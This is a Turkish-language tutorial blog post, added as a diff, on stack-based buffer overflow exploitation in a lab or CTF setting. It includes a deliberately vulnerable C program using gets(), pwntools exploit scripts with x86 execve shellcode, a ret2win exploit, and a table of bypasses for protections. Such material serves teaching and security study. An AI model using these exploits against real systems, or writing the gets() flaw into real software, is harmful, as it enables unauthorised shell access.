@@ -1,0 +1,228 @@
+---
+title: "Buffer Overflow: Stack Tabanlı Saldırılar"
+date: "2026-03-09"
+description: "Stack tabanlı buffer overflow'un nasıl çalıştığını, EIP kontrolünden shellcode çalıştırmaya kadar adım adım ve pratik örneklerle anlattım."
+tags: ["Binary Exploitation", "CTF"]
+---
+
+## Buffer Overflow Nedir?
+
+Program bir tampona (buffer) sığmayacak kadar büyük veri yazarsa, fazlalık komşu bellek bölgelerine taşar. Stack üzerinde bu taşma **dönüş adresini (EIP/RIP)** ezebilir ve saldırgan program akışını istediği yere yönlendirebilir.
+
+```
+Yüksek adres
+┌──────────────┐
+│  Return Addr │  ← EIP — burası ezilirse program akışı değişir
+├──────────────┤
+│  Saved EBP   │
+├──────────────┤
+│              │
+│    Buffer    │  ← Kullanıcı verisi buraya yazılıyor
+│   [64 byte]  │
+└──────────────┘
+Düşük adres
+```
+
+## Güvenlik Açık Örnek Program
+
+```c
+// vuln.c
+#include <stdio.h>
+#include <string.h>
+
+void secret() {
+    system("/bin/bash");
+}
+
+void vuln() {
+    char buf[64];
+    gets(buf);   // ❌ sınır kontrolü yok
+}
+
+int main() {
+    printf("İsminizi girin: ");
+    vuln();
+    return 0;
+}
+```
+
+```bash
+# Koruma mekanizmalarını kapatarak derle (lab ortamı)
+gcc -m32 -fno-stack-protector -z execstack -no-pie \
+  -o vuln vuln.c
+```
+
+## Adım 1: Çöküşü Bulmak
+
+```python
+# fuzzer.py — artan boyutta input gönder
+import subprocess
+
+for i in range(100, 500, 10):
+    payload = b"A" * i
+    result = subprocess.run(
+        ["./vuln"],
+        input=payload,
+        capture_output=True
+    )
+    if result.returncode != 0:
+        print(f"[+] Çöküş: {i} byte")
+        break
+```
+
+## Adım 2: EIP Offset'ini Bulmak
+
+```bash
+# Benzersiz desen oluştur
+python3 -c "
+import string
+pattern = ''
+for i in string.ascii_uppercase:
+    for j in string.ascii_lowercase:
+        for k in string.digits:
+            pattern += i+j+k
+print(pattern[:300])
+" > pattern.txt
+
+# GDB ile çalıştır
+gdb ./vuln
+(gdb) run < pattern.txt
+# Segfault sonrası EIP değerini not al: 0x41326941
+
+# Offset'i hesapla
+python3 -c "
+pattern = open('pattern.txt').read()
+eip = 'Ai2A'   # little-endian dönüşümü
+print(pattern.index(eip))
+"
+# Çıktı: 76 → EIP 76. byte'ta
+```
+
+Alternatif olarak `pwndbg` veya `pwntools`:
+
+```python
+from pwn import *
+
+# Cyclic pattern
+pattern = cyclic(200)
+# Offset bul
+offset = cyclic_find(0x41326941)
+print(f"Offset: {offset}")  # 76
+```
+
+## Adım 3: EIP'yi Kontrol Etmek
+
+```python
+from pwn import *
+
+offset = 76
+payload = b"A" * offset + b"B" * 4  # EIP = 0x42424242
+
+p = process("./vuln")
+p.sendline(payload)
+p.interactive()
+```
+
+GDB'de `x/x $eip` → `0x42424242` görünüyorsa EIP kontrolü sağlandı.
+
+## Adım 4: Shellcode ile Exploit
+
+### Linux x86 — execve(/bin/sh)
+
+```python
+from pwn import *
+
+offset = 76
+
+# /bin/sh açan shellcode (25 byte)
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+shellcode += b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+shellcode += b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+# Stack adresini bul (ASLR kapalı ortamda)
+p = process("./vuln")
+# gdb'den: x/50x $esp → shellcode'un yükleneceği adres
+ret_addr = p32(0xffffd120)
+
+# NOP sled + shellcode + padding + ret
+nop_sled = b"\x90" * 30
+payload = nop_sled + shellcode
+payload += b"A" * (offset - len(nop_sled) - len(shellcode))
+payload += ret_addr
+
+p.sendline(payload)
+p.interactive()
+```
+
+## Adım 5: ret2win — Fonksiyon Çağırma
+
+ASLR/NX açıksa shellcode çalıştırmak yerine mevcut bir fonksiyonu çağırın:
+
+```python
+from pwn import *
+
+elf = ELF("./vuln")
+offset = 76
+
+# secret() fonksiyonunun adresi
+win_addr = p32(elf.symbols["secret"])
+
+payload = b"A" * offset + win_addr
+
+p = process("./vuln")
+p.sendline(payload)
+p.interactive()
+```
+
+## Koruma Mekanizmaları
+
+```bash
+# Binary'nin korumalarını kontrol et
+checksec --file=./vuln
+```
+
+| Koruma | Açıklama | Bypass |
+|---|---|---|
+| **ASLR** | Stack/heap adresleri rastgele | Leak + offset hesapla |
+| **NX/DEP** | Stack'te kod çalıştırma yok | ROP chain |
+| **Stack Canary** | Return addr'den önce canary değeri | Canary leak |
+| **PIE** | Binary adresleri rastgele | Leak + base hesapla |
+| **RELRO** | GOT tablosu salt okunur | Partial RELRO bypass |
+
+## GDB Pwndbg Kısa Rehberi
+
+```bash
+# Kur
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg && ./setup.sh
+
+# Kullanım
+gdb ./vuln
+(gdb) run
+(gdb) info registers          # register değerleri
+(gdb) x/50x $esp              # stack içeriğini hex göster
+(gdb) x/s 0xffffd120          # adresteki string
+(gdb) disas vuln              # fonksiyonu disassemble et
+(gdb) b *vuln+30              # breakpoint ekle
+(gdb) ni                      # next instruction
+```
+
+## CTF'te Hızlı Başlangıç
+
+```bash
+# 1. Koruma seviyesini gör
+checksec --file=./chal
+
+# 2. Fonksiyonları listele
+objdump -d ./chal | grep "<.*>:"
+nm ./chal | grep " T "
+
+# 3. String'leri tara
+strings ./chal | grep -i "flag\|win\|shell"
+
+# 4. Ltrace / strace ile davranış izle
+ltrace ./chal
+strace ./chal
+```
+
+Bir sonraki yazıda **ROP (Return-Oriented Programming)** ile NX korumasını atlatmayı ele alacağım.
